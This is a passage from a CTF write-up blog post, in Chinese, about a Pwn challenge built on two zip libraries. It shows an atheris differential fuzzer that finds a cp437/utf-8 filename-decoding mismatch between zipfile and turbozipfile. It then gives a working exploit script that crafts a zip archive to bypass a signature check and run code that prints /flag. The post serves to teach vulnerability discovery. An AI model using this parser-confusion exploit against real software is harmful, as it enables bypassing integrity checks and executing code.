<p>通过readme可以猜测，漏洞位于turbozipfile库中。很显然不可能去分析二进制文件，结合题目名称可知必须通过fuzz定位漏洞，但我在比赛时瞎fuzz了很久都没有任何收获。赛后通过官方题解我又学到了一个新知识，差分fuzz是最适用于这种情况的，服务器中混用了2个功能类似的库，若他们的功能细节上存在些许不同就可能引发逻辑漏洞。编写差分fuzzer的思路也很普通，原先的libfuzzer是在fuzzer中调用待测库的函数，而差分fuzzer就是2个要比较的库的功能函数都调用，然后比较它们的结果有何不同，若是发现不同就抛出异常产生crash。以下是我照着官方fuzzer写的fuzzer。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> atheris</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> atheris.instrument_imports():</span><br><span class="line">	<span class="keyword">import</span> turbozipfile</span><br><span class="line">	<span class="keyword">import</span> zipfile</span><br><span class="line">	<span class="keyword">import</span> io</span><br><span class="line">	<span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@atheris.instrument_func</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comp</span><span class="params">(left, right)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> type(left) == str <span class="keyword">and</span> type(right) == bytes:</span><br><span class="line">    <span class="keyword">return</span> left.encode(<span class="string">"utf-8"</span>) == right</span><br><span class="line">  <span class="keyword">if</span> type(left) == bytes <span class="keyword">and</span> type(right) == str:</span><br><span class="line">    <span class="keyword">return</span> left == right.encode(<span class="string">"utf-8"</span>)</span><br><span class="line">  <span class="keyword">return</span> left == right</span><br><span class="line"></span><br><span class="line"><span class="meta">@atheris.instrument_func</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TestOneInput</span><span class="params">(data)</span>:</span></span><br><span class="line">	<span class="keyword">with</span> io.BytesIO(data) <span class="keyword">as</span> f:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			zf=zipfile.ZipFile(f)</span><br><span class="line">			tf=turbozipfile.ZipFile(f)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		pinfos=zf.infolist()</span><br><span class="line">		finfos=tf.infolist()</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> len(pinfos) != len(finfos):</span><br><span class="line">			<span class="keyword">raise</span> RuntimeError(<span class="string">"Info length disagreement"</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(len(pinfos)):</span><br><span class="line">			pinfo=pinfos[i]</span><br><span class="line">			finfo=finfos[i]</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> comp(pinfo.comment,finfo.comment):</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"comment disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.compress_size != finfo.compress_size:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"comment size disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.compress_type != finfo.compress_type:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"compress type disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.external_attr != finfo.external_attr:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"external_attr disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.extra != finfo.extra:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"extra disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.file_size != finfo.file_size:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"file size disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> comp(pinfo.filename,finfo.filename):</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"filename disagreement: &#123;&#125; &#123;&#125;"</span>.format(pinfo.filename,finfo.filename))</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> pinfo.flag_bits != finfo.flag_bits:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"flag_bits disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.header_offset != finfo.header_offset:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"header_offset disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.internal_attr != finfo.internal_attr:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"internal_attr disagreement"</span>)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">if</span> pinfo.is_dir() != finfo.is_dir():</span><br><span class="line">					<span class="keyword">raise</span> RuntimeError(<span class="string">"is_dir disagreement"</span>)</span><br><span class="line">			<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">pass</span></span><br><span class="line">			<span class="keyword">if</span> pinfo.reserved != finfo.reserved:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"reserved disagreement"</span>)</span><br><span class="line">			<span class="keyword">if</span> pinfo.volume != finfo.volume:</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"volume disagreement"</span>)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">with</span> zf.open(pinfo) <span class="keyword">as</span> zf2:</span><br><span class="line">					pdata=zf2.read()</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">with</span> tf.open(finfo) <span class="keyword">as</span> tf2:</span><br><span class="line">					fdata=tf2.read()</span><br><span class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(fdata != pdata):</span><br><span class="line">				<span class="keyword">raise</span> RuntimeError(<span class="string">"data disagreement"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atheris.Setup(sys.argv, TestOneInput)</span><br><span class="line">atheris.Fuzz()</span><br></pre></td></tr></table></figure>

<p>很快就能够跑出crash，如下可以看出两个库在分析zip包中的文件时，获取的文件名可能会不同。</p>
<p><img src="https://i.loli.net/2021/08/15/Mk43oUKmhrlYgCb.png" alt="image-20210815221204001"></p>
<p>相比于没有源码的turbozipfile，我们去看看zipfile要更加可行。直接看获取文件名信息的函数，是ZipFile类中的_RealGetContent方法，可以看到有2种解码方式，再配合我们fuzz时显示的2个库提取的文件名都带有不同的特殊符号，那么就能知道问题很可能出在编码上。</p>
<p><img src="https://i.loli.net/2021/08/15/8DVN2W7fcZdperE.png" alt="image-20210815222107796"></p>
<p>为了验证这一点，我们将fuzz时显示的2个文件名分别进行cp437和utf-8的编码，可以看到得到了同样的数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="string">"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob╧¿iWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">n2=<span class="string">"sample.YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4obϨiWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">print(n1.encode(<span class="string">'cp437'</span>))</span><br><span class="line">print(n2.encode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/15/YTzPEUvkKV89jA3.png" alt="image-20210815222737138"></p>
<p>这说明turbozipfile和zipfile在提取文件名时的解码方式不同，turbozipfile使用utf-8，zipfile在flag &amp; 0x800为0时使用cp437。这意味着我们可以构造一个文件名p，它的末尾是base64编码的签名和autorun.py，并且使其在被cp437编码后还能被utf-8正常解码，调用zipfile将这个文件的名字写入到exp.zip中，这个文件的内容与sample的相同；第二个文件的名字则是由p经过utf-8编码再utf-8解码得到的，也使用zipfile写入到exp.zip中，它的内容是读取flag并打印。两个文件名都要utf-8解码的原因是zipfile在写入文件名时会进行一次utf-8编码。最后还要记得将生成的exp.zip中File header和Central directory file header中表示文件名编码的flag最高位改为0，这样zipfile才会使用cp437来解码。</p>
<p>exp的原理是文件一的名字被cp437解码后会得到p，由于它的内容与sample相同所以能够通过签名校验。此时find_valid_autorun返回，由turbozipfile解压缩，它使用utf-8解码文件一名字得到的不是p，而解码文件二名字时会得到p，因此它会运行文件二，读取并打印出flag。</p>
</li>
<li><p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> turbozipfile</span><br><span class="line"></span><br><span class="line">p=<span class="string">'πü½πü╗πéô.'</span></span><br><span class="line">p=p+<span class="string">"YMH2otgxGvZoXI436R0OlH2Go5NJzawo8GFL0fl24lxRx1ShgasmHuufYEqFs4ob1aiWrqxZqgHCPX4Nyc6WAQ.autorun.py"</span></span><br><span class="line">print(p)</span><br><span class="line">z=zipfile.ZipFile(<span class="string">'../exp.zip'</span>,<span class="string">'w'</span>)</span><br><span class="line">f=z.open(p.encode(<span class="string">'cp437'</span>).decode(<span class="string">'utf-8'</span>),<span class="string">'w'</span>)</span><br><span class="line">print(p.encode(<span class="string">'cp437'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">content=<span class="string">"""import os</span></span><br><span class="line"><span class="string">print("Directory contents:")</span></span><br><span class="line"><span class="string">for path in os.listdir('.'):</span></span><br><span class="line"><span class="string">  if path == '.' or path == '..':</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">  if path.endswith(".autorun.py"):</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">  print(path)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=z.open(p.encode(<span class="string">'utf-8'</span>).decode(<span class="string">'utf-8'</span>),<span class="string">'w'</span>)</span><br><span class="line">content=<span class="string">"""file=open("/flag")</span></span><br><span class="line"><span class="string">print(file.read())</span></span><br><span class="line"><span class="string">file.close()</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br><span class="line">z.close()</span><br><span class="line"></span><br><span class="line">zf=open(<span class="string">"../exp.zip"</span>,<span class="string">'rb'</span>)</span><br><span class="line">content=zf.read().replace(<span class="string">b'\x14\x00\x00\x08'</span>,<span class="string">b'\x14\x00\x00\x00'</span>)</span><br><span class="line">zf.close()</span><br><span class="line">zf=open(<span class="string">"../exp.zip"</span>,<span class="string">'wb'</span>)</span><br><span class="line">zf.write(content)</span><br><span class="line">zf.close()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>高质量Pwn题难点基本都在于发现漏洞，但我都是看过漏洞点后才复现出的，到头来练习的还只是漏洞利用啊。</p>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2021-08-29T07:07:28.211Z" itemprop="dateUpdated">2021-08-29 15:07:28</time>
</span><br>


        
    </div>
    
    <footer>
        <a href="https://veltavid.github.io">
            <img src="/img/avatar.jpg" alt="velta">
            velta
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://veltavid.github.io/2021/08aa1d853a.html&title=《几道有意思的Pwn题的复现》 — velta's blog&pic=https://veltavid.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://veltavid.github.io/2021/08aa1d853a.html&title=《几道有意思的Pwn题的复现》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://veltavid.github.io/2021/08aa1d853a.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《几道有意思的Pwn题的复现》 — velta's blog&url=https://veltavid.github.io/2021/08aa1d853a.html&via=https://veltavid.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://veltavid.github.io/2021/08aa1d853a.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/0811c4c4be.html" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">2021HWS初赛writeup</h4>
      </a>
    </div>
  

  
</nav>



    


<section class="comments" id="comments">
    <div id="disqus_thread"></div>
    <script>
    var disqus_shortname = 'true';
    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</section>



















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>velta &copy; 2021 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://veltavid.github.io/2021/08aa1d853a.html&title=《几道有意思的Pwn题的复现》 — velta's blog&pic=https://veltavid.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://veltavid.github.io/2021/08aa1d853a.html&title=《几道有意思的Pwn题的复现》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://veltavid.github.io/2021/08aa1d853a.html" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《几道有意思的Pwn题的复现》 — velta's blog&url=https://veltavid.github.io/2021/08aa1d853a.html&via=https://veltavid.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://veltavid.github.io/2021/08aa1d853a.html" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://veltavid.github.io/2021/08aa1d853a.html" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
